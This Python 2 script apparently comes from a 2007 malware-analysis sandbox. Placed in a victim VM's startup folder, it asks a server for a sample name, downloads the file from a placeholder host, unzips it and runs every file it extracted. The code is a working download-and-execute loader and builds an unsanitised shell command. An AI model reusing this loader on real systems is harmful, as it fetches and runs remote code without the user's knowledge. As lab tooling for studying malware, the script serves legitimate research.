#coding=utf-8
'''
	Short script installed into victim-images startfolder, automatically executed on startup.
	Handles uploading the malware from the TIS, unzipping if necessary and executing it.

    @copyright: 2007 by Mirko Sailio
    @license: MIT <http://www.opensource.org/licenses/mit-license.php>

'''

import os, time
import sys
import urllib2
import string
from socket import *
#import socket
from urlparse import urlparse

debug = 'true'

port = 45552

#if( len( sys.argv )< 2 ):
#    local_file = 'Maltsu.exe'
#else:
#    local_file = sys.argv[1]

remote_path = 'http://foo.invalid/malwarezor/'#hot path
#remote_host = 'localhost'
remote_host = urlparse(remote_path)[1]

notify_addr = (remote_host, port)

s = socket( AF_INET, SOCK_STREAM )

try:
    s.connect( notify_addr )
except error:
    print "Unable to connect to socket:", remote_host, port
    sys.exit( 1 )
#lets ask for maltsu
if( debug ): print "Connection made to:", remote_host, port
#s.send( 'Good morning butler. Whats the name of my mw tonight?' )

mw_filename = s.recv( 1024 )
if( debug ): print "Receaved mw-name:", mw_filename

remote_file =  remote_path + mw_filename

if( debug ): print remote_file

s.close()

# * Name chancing if necessary for the MW *
#
# If name is only a hash, let's try making it a executable.
extension = mw_filename.split( '.' )
if( not len( extension ) > 1 ):
    mw_filename += ".exe"
    
localfolder = "C:/Documents and Settings/PelleSec/Desktop/mw/"
localfile =  localfolder + mw_filename





if( os.path.isfile( localfile ) == 0 ):
    writeHandle = open( localfile, 'wb' )
    remote_file = urllib2.urlopen( remote_file )
    size = remote_file.info()
    
    # readlineä sizestä --> 6. rivi on Content length, pituus on ':' n jälkeen
    # info gives a HTMLelement, thaT LOOKS LIKE DIS:
    # Date: Thu, 31 May 2007 07:53:29 GMT
    # Server: Apache/2.0.59 (Unix) mod_python/3.3.1 Python/2.5.1 PHP/5.2.2 DAV/2
    # Last-Modified: Wed, 07 Feb 2007 09:54:43 GMT
    # ETag: "6c38a1-a62d-ea71fec0"
    # Accept-Ranges: bytes
    # Content-Length: 42541
    # Connection: close
    # Content-Type: application/pdf

    size = str( size ).split( "\n" )
    size = size[5].split( ":" )
    size = int( size[1] )

    a = remote_file.read( min( size, 1500 ) )
    while  size > 0:
        writeHandle.write( a )
        #print size
        size -= len(a)#1500 
        a = remote_file.read( 1500 )
    print "File", localfile, "copied from" ,remote_path
    writeHandle.close()
    #s.send("running")
    
    
else:
    print localfile, "exists and could not be loaded."
    sys.exit( 2 )


# If it's a zip, we needs to unzip it, like now.
#
if( mw_filename[-4:] == ".zip" ):
    command_string = "unzip -j " + "\"" + localfile + "\"" +" -d " + "\"" + localfolder + "\""
    os.system( command_string )
    #os.wait()
    os.rename( localfile, "C:/Documents and Settings/PelleSec/Desktop/extractedzip.zip" )

for malwarefiles in os.listdir( localfolder ):
    print localfolder + "/" + malwarefiles
    os.startfile( localfolder + "/" + malwarefiles )

time.sleep( 30 )
